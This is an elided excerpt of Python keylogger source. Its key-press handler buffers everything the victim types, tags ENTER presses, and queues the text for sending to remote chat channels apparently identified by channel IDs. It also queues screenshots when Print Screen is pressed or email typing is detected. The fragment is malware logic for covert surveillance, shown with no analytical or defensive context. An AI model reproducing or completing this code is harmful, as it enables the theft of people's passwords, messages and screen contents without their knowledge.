...
def on_press(key):
    ...
    if processed_key not in [Key.ctrl_l, Key.alt_gr, Key.left, Key.right, Key.up, Key.down, Key.delete, Key.alt_l, Key.shift_r]:
        ...
        if processed_key == Key.enter:
            processed_key = ''; messages_to_send.append([channel_ids['man'], text_buffor + ' *`ENTER`*']); text_buffor = ''
                ...
                embeds_to_send.append([channel_ids['man'], current_time() + (' `[Print Screen pressed]`' if processed_key == ' *`Print Screen`*' else ' `[Email typing]`'), 'ss.png'])
        ...
        if len(text_buffor) > 1975:
            if 'wwwww' in text_buffor or 'aaaaa' in text_buffor or 'sssss' in text_buffor or 'ddddd' in text_buffor:
                messages_to_send.append([channel_ids['sam'], text_buffor])
            else:
                messages_to_send.append([channel_ids['man'], text_buffor])
            text_buffor = ''
